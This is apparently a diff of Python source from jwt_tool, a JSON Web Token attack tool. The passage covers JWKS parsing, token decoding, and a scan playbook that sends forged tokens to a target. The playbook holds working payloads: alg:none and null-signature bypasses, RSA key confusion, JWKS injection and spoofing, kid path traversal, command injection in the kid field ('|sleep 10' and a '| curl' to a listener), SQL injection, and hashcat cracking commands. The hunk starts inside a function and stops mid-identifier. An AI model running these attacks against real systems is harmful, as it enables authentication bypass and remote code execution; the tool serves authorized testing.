@@ -1499,3 +1499,648 @@ def scanModePlaybook():
             injectExternalInteractionPayload(config['services']['httplistener']+"/inject_existing_", payloadClaim)
         cprintc("External service interactions have been tested - check your listener for interactions", "green")
     else:
+        h = SHA256.new(newContents)
+    elif headDict['alg'] == "PS384":
+        h = SHA384.new(newContents)
+    elif headDict['alg'] == "PS512":
+        h = SHA512.new(newContents)
+    else:
+        cprintc("Invalid RSA algorithm", "red")
+    verifier = pss.new(key)
+    try:
+        valid = verifier.verify(h, sig)
+        cprintc("RSA-PSS Signature is VALID", "green")
+        valid = True
+    except:
+        cprintc("RSA-PSS Signature is INVALID", "red")
+        valid = False
+    return valid
+
+def exportJWKS(jku):
+    try:
+        kid = headDict["kid"]
+        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'], kid)
+    except:
+        kid = ""
+        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'])
+    return newContents, newSig
+
+def parseJWKS(jwksfile):
+    jwks = open(jwksfile, "r").read()
+    jwksDict = json.loads(jwks, object_pairs_hook=OrderedDict)
+    nowtime = int(datetime.now().timestamp())
+    cprintc("JWKS Contents:", "cyan")
+    try:
+        keyLen = len(jwksDict["keys"])
+        cprintc("Number of keys: "+str(keyLen), "cyan")
+        i = -1
+        for jkey in range(0,keyLen):
+            i += 1
+            cprintc("\n--------", "white")
+            try:
+                cprintc("Key "+str(i+1), "cyan")
+                kid = str(jwksDict["keys"][i]["kid"])
+                cprintc("kid: "+kid, "cyan")
+            except:
+                kid = i
+                cprintc("Key "+str(i+1), "cyan")
+            for keyVal in jwksDict["keys"][i].items():
+                keyVal = keyVal[0]
+                cprintc("[+] "+keyVal+" = "+str(jwksDict["keys"][i][keyVal]), "green")
+            try:
+                x = str(jwksDict["keys"][i]["x"])
+                y = str(jwksDict["keys"][i]["y"])
+                cprintc("\nFound ECC key factors, generating a public key", "cyan")
+                pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
+                cprintc("[+] "+pubkeyName, "green")
+                cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
+                valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
+            except:
+                pass
+            try:
+                n = str(jwksDict["keys"][i]["n"])
+                e = str(jwksDict["keys"][i]["e"])
+                cprintc("\nFound RSA key factors, generating a public key", "cyan")
+                pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
+                cprintc("[+] "+pubkeyName, "green")
+                cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
+                valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
+            except:
+                pass
+    except:
+        cprintc("Single key file", "white")
+        for jkey in jwksDict:
+            cprintc("[+] "+jkey+" = "+str(jwksDict[jkey]), "green")
+        try:
+            kid = 1
+            x = str(jwksDict["x"])
+            y = str(jwksDict["y"])
+            cprintc("\nFound ECC key factors, generating a public key", "cyan")
+            pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
+            cprintc("[+] "+pubkeyName, "green")
+            cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
+            valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
+        except:
+            pass
+        try:
+            kid = 1
+            n = str(jwksDict["n"])
+            e = str(jwksDict["e"])
+            cprintc("\nFound RSA key factors, generating a public key", "cyan")
+            pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
+            cprintc("[+] "+pubkeyName, "green")
+            cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
+            valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
+        except:
+            pass
+
+def genECPubFromJWKS(x, y, kid, nowtime):
+    try:
+        x = int.from_bytes(base64.urlsafe_b64decode(x), byteorder='big')
+    except:
+        pass
+    try:
+        x = int.from_bytes(base64.urlsafe_b64decode(x+"="), byteorder='big')
+    except:
+        pass
+    try:
+        x = int.from_bytes(base64.urlsafe_b64decode(x+"=="), byteorder='big')
+    except:
+        pass
+    try:
+        y = int.from_bytes(base64.urlsafe_b64decode(y), byteorder='big')
+    except:
+        pass
+    try:
+        y = int.from_bytes(base64.urlsafe_b64decode(y+"="), byteorder='big')
+    except:
+        pass
+    try:
+        y = int.from_bytes(base64.urlsafe_b64decode(y+"=="), byteorder='big')
+    except:
+        pass
+    new_key = ECC.construct(curve='P-256', point_x=x, point_y=y)
+    pubKey = new_key.public_key().export_key(format="PEM")+"\n"
+    pubkeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
+    with open(pubkeyName, 'w') as test_pub_out:
+        test_pub_out.write(pubKey)
+    return pubkeyName
+
+def genRSAPubFromJWKS(n, e, kid, nowtime):
+    try:
+        n = int.from_bytes(base64.urlsafe_b64decode(n), byteorder='big')
+    except:
+        pass
+    try:
+        n = int.from_bytes(base64.urlsafe_b64decode(n+"="), byteorder='big')
+    except:
+        pass
+    try:
+        n = int.from_bytes(base64.urlsafe_b64decode(n+"=="), byteorder='big')
+    except:
+        pass
+    try:
+        e = int.from_bytes(base64.urlsafe_b64decode(e), byteorder='big')
+    except:
+        pass
+    try:
+        e = int.from_bytes(base64.urlsafe_b64decode(e+"="), byteorder='big')
+    except:
+        pass
+    try:
+        e = int.from_bytes(base64.urlsafe_b64decode(e+"=="), byteorder='big')
+    except:
+        pass
+    new_key = RSA.construct((n, e))
+    pubKey = new_key.publickey().exportKey(format="PEM")
+    pubkeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
+    with open(pubkeyName, 'w') as test_pub_out:
+        test_pub_out.write(pubKey.decode()+"\n")
+    return pubkeyName
+
+def getVal(promptString):
+    newVal = input(promptString)
+    try:
+        newVal = json.loads(newVal)
+    except ValueError:
+        try:
+            newVal = json.loads(newVal.replace("'", '"'))
+        except ValueError:
+            pass
+    return newVal
+
+def genContents(headDict, paylDict, newContents=""):
+    if paylDict == {}:
+        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."
+    else:
+        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
+    return newContents.encode().decode('UTF-8')
+
+def dissectPayl(paylDict, count=False):
+    timeseen = 0
+    comparestamps = []
+    countval = 0
+    expiredtoken = False
+    nowtime = int(datetime.now().timestamp())
+    for claim in paylDict:
+        countval += 1
+        if count:
+            placeholder = str(countval)
+        else:
+            placeholder = "+"
+        if claim in ["exp", "nbf", "iat"]:
+            timestamp = datetime.fromtimestamp(int(paylDict[claim]))
+            if claim == "exp":
+                if int(timestamp.timestamp()) < nowtime:
+                    expiredtoken = True
+            cprintc("["+placeholder+"] "+claim+" = "+str(paylDict[claim])+"    ==> TIMESTAMP = "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC)", "green")
+            timeseen += 1
+            comparestamps.append(claim)
+        elif isinstance(paylDict[claim], dict):
+                cprintc("["+placeholder+"] "+claim+" = JSON object:", "green")
+                for subclaim in paylDict[claim]:
+                    if type(castInput(paylDict[claim][subclaim])) == str:
+                        cprintc("    [+] "+subclaim+" = \""+str(paylDict[claim][subclaim])+"\"", "green")
+                    elif paylDict[claim][subclaim] == None:
+                        cprintc("    [+] "+subclaim+" = null", "green")
+                    elif paylDict[claim][subclaim] == True and not paylDict[claim][subclaim] == 1:
+                        cprintc("    [+] "+subclaim+" = true", "green")
+                    elif paylDict[claim][subclaim] == False and not paylDict[claim][subclaim] == 0:
+                        cprintc("    [+] "+subclaim+" = false", "green")
+                    else:
+                        cprintc("    [+] "+subclaim+" = "+str(paylDict[claim][subclaim]), "green")
+        else:
+            if type(paylDict[claim]) == str:
+                cprintc("["+placeholder+"] "+claim+" = \""+str(paylDict[claim])+"\"", "green")
+            else:
+                cprintc("["+placeholder+"] "+claim+" = "+str(paylDict[claim]), "green")
+    return comparestamps, expiredtoken
+
+def validateToken(jwt):
+    try:
+        headB64, paylB64, sig = jwt.split(".",3)
+    except:
+        cprintc("[-] Invalid token:\nNot 3 parts -> header.payload.signature", "red")
+        exit(1)
+    try:
+        sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
+    except:
+        cprintc("[-] Invalid token:\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters", "red")
+        cprintc("----------------", "white")
+        cprintc(headB64, "cyan")
+        cprintc(paylB64, "cyan")
+        cprintc(sig, "red")
+        exit(1)
+    contents = headB64+"."+paylB64
+    contents = contents.encode()
+    try:
+        head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))
+    except:
+        cprintc("[-] Invalid token:\nCould not base64-decode HEADER - incorrect formatting/invalid characters", "red")
+        cprintc("----------------", "white")
+        cprintc(headB64, "red")
+        cprintc(paylB64, "cyan")
+        cprintc(sig, "cyan")
+        exit(1)
+    try:
+        payl = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
+    except:
+        cprintc("[-] Invalid token:\nCould not base64-decode PAYLOAD - incorrect formatting/invalid characters", "red")
+        cprintc("----------------", "white")
+        cprintc(headB64, "cyan")
+        cprintc(paylB64, "red")
+        cprintc(sig, "cyan")
+        exit(1)
+    try:
+        headDict = json.loads(head, object_pairs_hook=OrderedDict)
+    except:
+        cprintc("[-] Invalid token:\nHEADER not valid JSON format", "red")
+
+        cprintc(head.decode('UTF-8'), "red")
+        exit(1)
+    if payl.decode() == "":
+        cprintc("Payload is blank", "white")
+        paylDict = {}
+    else:
+        try:
+            paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
+        except:
+            cprintc("[-] Invalid token:\nPAYLOAD not valid JSON format", "red")
+            cprintc(payl.decode('UTF-8'), "red")
+            exit(1)
+    if args.verbose:
+        cprintc("Token: "+head.decode()+"."+payl.decode()+"."+sig+"\n", "green")
+    return headDict, paylDict, sig, contents
+
+def rejigToken(headDict, paylDict, sig):
+    cprintc("=====================\nDecoded Token Values:\n=====================", "white")
+    cprintc("\nToken header values:", "white")
+    for claim in headDict:
+        if isinstance(headDict[claim], dict):
+            cprintc("[+] "+claim+" = JSON object:", "green")
+            for subclaim in headDict[claim]:
+                if headDict[claim][subclaim] == None:
+                    cprintc("    [+] "+subclaim+" = null", "green")
+                elif headDict[claim][subclaim] == True:
+                    cprintc("    [+] "+subclaim+" = true", "green")
+                elif headDict[claim][subclaim] == False:
+                    cprintc("    [+] "+subclaim+" = false", "green")
+                elif type(headDict[claim][subclaim]) == str:
+                    cprintc("    [+] "+subclaim+" = \""+str(headDict[claim][subclaim])+"\"", "green")
+                else:
+                    cprintc("    [+] "+subclaim+" = "+str(headDict[claim][subclaim]), "green")
+        else:
+            if type(headDict[claim]) == str:
+                cprintc("[+] "+claim+" = \""+str(headDict[claim])+"\"", "green")
+            else:
+                cprintc("[+] "+claim+" = "+str(headDict[claim]), "green")
+    cprintc("\nToken payload values:", "white")
+    comparestamps, expiredtoken = dissectPayl(paylDict)
+    if len(comparestamps) >= 2:
+        cprintc("\nSeen timestamps:", "white")
+        cprintc("[*] "+comparestamps[0]+" was seen", "green")
+        claimnum = 0
+        for claim in comparestamps:
+            timeoff = int(paylDict[comparestamps[claimnum]])-int(paylDict[comparestamps[0]])
+            if timeoff != 0:
+                timecalc = timeoff
+                if timecalc < 0:
+                    timecalc = timecalc*-1
+                days,hours,mins = 0,0,0
+                if timecalc >= 86400:
+                    days = str(timecalc/86400)
+                    days = int(float(days))
+                    timecalc -= days*86400
+                if timecalc >= 3600:
+                    hours = str(timecalc/3600)
+                    hours = int(float(hours))
+                    timecalc -= hours*3600
+                if timecalc >= 60:
+                    mins = str(timecalc/60)
+                    mins = int(float(mins))
+                    timecalc -= mins*60
+                if timeoff < 0:
+                    timeoff = timeoff*-1
+                    prepost = "[*] "+claim+" is earlier than "+comparestamps[0]+" by: "
+                    cprintc(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
+                else:
+                    prepost = "[*] "+claim+" is later than "+comparestamps[0]+" by: "
+                    cprintc(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
+            claimnum += 1
+    if expiredtoken:
+        cprintc("[-] TOKEN IS EXPIRED!", "red")
+    cprintc("\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------\n", "white")
+    if args.targeturl and not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
+        cprintc("[+] Sending token", "cyan")
+        newContents = genContents(headDict, paylDict)
+        jwtOut(newContents+"."+sig, "Sending token")
+    return headDict, paylDict, sig
+
+def searchLog(logID):
+    qResult = ""
+    with open(logFilename, 'r') as logFile:
+        logLine = logFile.readline()
+        while logLine:
+            if re.search('^'+logID, logLine):
+                qResult = logLine
+                break
+            else:
+                logLine = logFile.readline()
+        if qResult:
+            qOutput = re.sub(' - eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', '', qResult)
+            qOutput = re.sub(logID+' - ', '', qOutput)
+            try:
+                jwt = re.findall('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', qResult)[-1]
+            except:
+                cprintc("JWT not included in log", "red")
+                exit(1)
+            cprintc(logID+"\n"+qOutput, "green")
+            cprintc("JWT from request:", "cyan")
+            cprintc(jwt, "green")
+            # headDict, paylDict, sig, contents = validateToken(jwt)
+            # rejigToken(headDict, paylDict, sig)
+            return jwt
+        else:
+            cprintc("ID not found in logfile", "red")
+
+def injectOut(newheadDict, newpaylDict):
+    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
+        desc = "Injected token with unchanged signature"
+        jwtOut(newContents+"."+sig, "Injected claim", desc)
+    elif args.sign:
+        signingToken(newheadDict, newpaylDict)
+    else:
+        runActions()
+
+def scanModePlaybook():
+    cprintc("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
+    origalg = headDict["alg"]
+    # No token
+    tmpCookies = config['argvals']['cookies']
+    tmpHeader = config['argvals']['header']
+    if config['argvals']['headerloc'] == "cookies":
+        config['argvals']['cookies'] = strip_dict_cookies(config['argvals']['cookies'])
+    elif config['argvals']['headerloc'] == "headers":
+        config['argvals']['header'] = ""
+    config['argvals']['overridesub'] = "true"
+    config['argvals']['cookies'] = tmpCookies
+    config['argvals']['header'] = tmpHeader
+    # Broken sig
+    jwtTweak = contents.decode()+"."+sig[:-4]
+    jwtOut(jwtTweak, "Broken signature", "This token was sent to check if the signature is being checked")
+    # Persistent
+    jwtOut(jwt, "Persistence check 1 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
+    # Claim processing order - check reflected output in all claims
+    reflectedClaims()
+    jwtOut(jwt, "Persistence check 2 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
+    # Weak HMAC secret
+    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
+        cprintc("Testing "+headDict['alg']+" token against common JWT secrets (jwt-common.txt)", "cyan")
+        config['argvals']['keyList'] = "jwt-common.txt"
+        crackSig(sig, contents)
+    # Exploit: blank password accepted in signature
+    key = ""
+    newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
+    jwtBlankPw = newContents+"."+newSig
+    jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)", "This token can exploit a hard-coded blank password in the config")
+    # Exploit: null signature
+    jwtNull = checkNullSig(contents)
+    jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
+    # Exploit: alg:none
+    noneToks = checkAlgNone(headDict, paylB64)
+    zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
+    for noneTok in zippedToks:
+        jwtOut(noneTok, "Exploit: "+zippedToks[noneTok]+" (-X a)", "Testing whether the None algorithm is accepted - which allows forging unsigned tokens")
+    # Exploit: key confusion - use provided PubKey
+    if config['crypto']['pubkey']:
+                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
+                jwtOut(newTok+"."+newSig, "Exploit: RSA Key Confusion Exploit (provided Public Key)")
+    headDict["alg"] = origalg
+    # Exploit: jwks injection
+    try:
+        origjwk = headDict["jwk"]
+    except:
+        origjwk = False
+    jwksig, jwksContents = jwksEmbed(headDict, paylDict)
+    jwtOut(jwksContents+"."+jwksig, "Exploit: Injected JWKS (-X i)")
+    headDict["alg"] = origalg
+    if origjwk:
+        headDict["jwk"] = origjwk
+    else:
+        del headDict["jwk"]
+    # Exploit: spoof jwks
+    try:
+        origjku = headDict["jku"]
+    except:
+        origjku = False
+        if config['services']['jwksloc']:
+            jku = config['services']['jwksloc']
+        else:
+            jku = config['services']['jwksdynamic']
+    newContents, newSig = exportJWKS(jku)
+    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+jku)
+    if origjku:
+        headDict["jku"] = origjku
+    else:
+        del headDict["jku"]
+    headDict["alg"] = origalg
+    # kid testing... start
+    try:
+        origkid = headDict["kid"]
+    except:
+        origkid = False
+    # kid inject: blank field, sign with null
+    newheadDict, newHeadB64 = injectheaderclaim("kid", "")
+    key = open(path+"/null.txt").read()
+    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with blank kid")
+    # kid inject: path traversal - known path - check for robots.txt, sign with variations of location
+    newheadDict, newHeadB64 = injectheaderclaim("kid", "../../../../../../dev/null")
+    key = open(path+"/null.txt").read()
+    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"[path traversal]/dev/null\"")
+    newheadDict, newHeadB64 = injectheaderclaim("kid", "/dev/null")
+    key = open(path+"/null.txt").read()
+    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"/dev/null\"")
+    # kid inject: path traversal - bad path - sign with null
+    newheadDict, newHeadB64 = injectheaderclaim("kid", "/invalid_path")
+    key = open(path+"/null.txt").read()
+    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"/invalid_path\"")
+    # kid inject: RCE - sign with null
+    newheadDict, newHeadB64 = injectheaderclaim("kid", "|sleep 10")
+    key = open(path+"/null.txt").read()
+    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+    jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?)")
+    if config['services']['httplistener']:
+        injectUrl = config['services']['httplistener']+"/RCE_in_kid"
+        newheadDict, newHeadB64 = injectheaderclaim("kid", "| curl "+injectUrl)
+        key = open(path+"/null.txt").read()
+        newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+        jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - curl "+injectUrl+" (did this URL get accessed?)")
+    # kid inject: SQLi explicit value
+    newheadDict, newHeadB64 = injectheaderclaim("kid", "x' UNION SELECT '1';--")
+    key = "1"
+    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
+    jwtOut(newContents+"."+newSig, "Injected kid claim - signed with secret = '1' from SQLi")
+    # kid testing... end
+    if origkid:
+        headDict["kid"] = origkid
+    else:
+        del headDict["kid"]
+    headDict["alg"] = origalg
+    # x5u external
+    # Force External Interactions
+    if config['services']['httplistener']:
+        for headerClaim in headDict:
+            injectExternalInteractionHeader(config['services']['httplistener']+"/inject_existing_", headerClaim)
+        for payloadClaim in paylDict:
+            injectExternalInteractionPayload(config['services']['httplistener']+"/inject_existing_", payloadClaim)
+        cprintc("External service interactions have been tested - check your listener for interactions", "green")
+    else:
+        cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
+    # Accept Common HMAC secret (as alterative signature)
+    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
+        commonPass = commonPassList.readline().rstrip()
+        while commonPass:
+            newSig, newContents = signTokenHS(headDict, paylDict, commonPass, 256)
+            jwtOut(newContents+"."+newSig, "Checking for alternative accepted HMAC signatures, based on common passwords. Testing: "+commonPass+"", "This token can exploit a hard-coded common password in the config")
+            commonPass = commonPassList.readline().rstrip()
+    # SCAN COMPLETE
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
+    # Further manual testing: check expired token, brute key, find Public Key, run other scans
+    cprintc("The following additional checks should be performed that are better tested manually:", "magenta")
+    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
+        cprintc("[+] Try testing "+headDict['alg'][:2]+" token against weak password configurations by running the following hashcat cracking options:", "green")
+        cprintc("(Already testing against passwords in jwt-common.txt)", "cyan")
+        cprintc("Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6", "cyan")
+    if headDict['alg'][:2] != "HS" and headDict['alg'][:2] != "hs":
+        cprintc("[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)", "green")
+        cprintc("Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:", "cyan")
+        with open('jwks-common.txt', "r", encoding='utf-8', errors='ignore') as jwksLst:
+            nextVal = jwksLst.readline().rstrip()
+            while nextVal:
+                cprintc(nextVal, "cyan")
+                nextVal = jwksLst.readline().rstrip()
+    try:
+        timestamp = datetime.fromtimestamp(int(paylDict['exp']))
+        cprintc("[+] Try waiting for the token to expire (\"exp\" value set to: "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC))", "green")
+        cprintc("Check if still working once expired.", "cyan")
+    except:
+        pass
+
+def scanModeErrors():
+    cprintc("\nLAUNCHING SCAN: Forced Errors", "magenta")
+    # Inject dangerous content-types into existing header claims
+    injectEachHeader(None)
+    injectEachHeader(True)
+    injectEachHeader(False)
+    injectEachHeader("jwt_tool")
+    injectEachHeader(0)
+    # Inject dangerous content-types into existing payload claims
+    injectEachPayload(None)
+    injectEachPayload(True)
+    injectEachPayload(False)
+    injectEachPayload("jwt_tool")
+    injectEachPayload(0)
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
+
+def scanModeCommonClaims():
+    cprintc("\nLAUNCHING SCAN: Common Claim Injection", "magenta")
+    # Inject external URLs into common claims
+    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
+        nextHeader = commonHeaders.readline().rstrip()
+        while nextHeader:
+            injectExternalInteractionHeader(config['services']['httplistener']+"/inject_common_", nextHeader)
+            nextHeader = commonHeaders.readline().rstrip()
+    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
+        nextPayload = commonPayloads.readline().rstrip()
+        while nextPayload:
+            injectExternalInteractionPayload(config['services']['httplistener']+"/inject_common_", nextPayload)
+            nextPayload = commonPayloads.readline().rstrip()
+    # Inject dangerous content-types into common claims
+    injectCommonClaims(None)
+    injectCommonClaims(True)
+    injectCommonClaims(False)
+    injectCommonClaims("jwt_tool")
+    injectCommonClaims(0)
+
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
+
+def injectCommonClaims(contentVal):
+    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
+        nextHeader = commonHeaders.readline().rstrip()
+        while nextHeader:
+            origVal = ""
+            try:
+                origVal = headDict[nextHeader]
+            except:
+                pass
+            headDict[nextHeader] = contentVal
+            newContents = genContents(headDict, paylDict)
+            jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Common Header Claim: "+str(nextHeader))
+            if origVal != "":
+                headDict[nextHeader] = origVal
+            else:
+                del headDict[nextHeader]
+            nextHeader = commonHeaders.readline().rstrip()
+    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
+        nextPayload = commonPayloads.readline().rstrip()
+        while nextPayload:
+            origVal = ""
+            try:
+                origVal = paylDict[nextPayload]
+            except:
+                pass
+            paylDict[nextPayload] = contentVal
+            newContents = genContents(headDict, paylDict)
+            jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Common Payload Claim: "+str(nextPayload))
+            if origVal != "":
+                paylDict[nextPayload] = origVal
+            else:
+                del paylDict[nextPayload]
+            nextPayload = commonPayloads.readline().rstrip()
+
+def injectEachHeader(contentVal):
+    for headerClaim in headDict:
+        origVal = headDict[headerClaim]
+        headDict[headerClaim] = contentVal
+        newContents = genContents(headDict, paylDict)
+        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Header Claim: "+str(headerClaim))
+        headDict[headerClaim] = origVal
+
+def injectEachPayload(contentVal):
+    for payloadClaim in paylDict:
+        origVal = paylDict[payloadClaim]
+        paylDict[payloadClaim] = contentVal
+        newContents = genContents(headDict, paylDict)
+        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Payload Claim: "+str(payloadClaim))
+        paylDict[payloadClaim] = origVal
+
+def injectExternalInteractionHeader(listenerUrl, headerClaim):
+    injectUrl = listenerUrl+headerClaim
+    origVal = ""
+    try:
+        origVal = headDict[headerClaim]
+    except:
+        pass
+    headDict[headerClaim] = injectUrl
+    newContents = genContents(headDict, paylDict)
+    jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Header Claim: "+str(headerClaim))
+    if origVal != "":
+        headDict[headerClaim] = origVal
+    else:
+        del headDict[headerClaim]
+
+def injectExternalInteractionPayload(listenerUrl, payloadClaim):
+    injectUrl = listenerUrl+payloadClaim
+    origVal = ""
+    try:
+        origVal = paylDict[payloadClaim]
+    except:
+        pass
+    paylDict[payloadClaim] = injectUrl
+    newContents = genContents(headDict, paylDict)
+    jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Payload Claim: "+str(payloadClaim))
+    if origVa
